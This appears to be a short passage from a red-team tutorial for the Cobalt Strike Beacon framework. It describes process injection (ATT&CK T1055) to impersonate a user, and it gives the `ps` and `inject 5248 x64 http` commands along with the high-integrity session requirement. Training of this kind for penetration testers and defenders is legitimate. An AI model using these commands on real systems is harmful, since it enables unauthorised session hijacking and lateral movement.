Another technique for impersonating a user, is to inject [T1055] Beacon shellcode directly into a process they are running. The new Beacon session that comes back will be running in the address space of this process and therefore under the security context of its owner.

Find a target process using the `ps` command or the process explorer, then inject shellcode for the given listener into it.
```
ps

inject 5248 x64 http
```

> You need a high-integrity session to inject into processes other than your own.
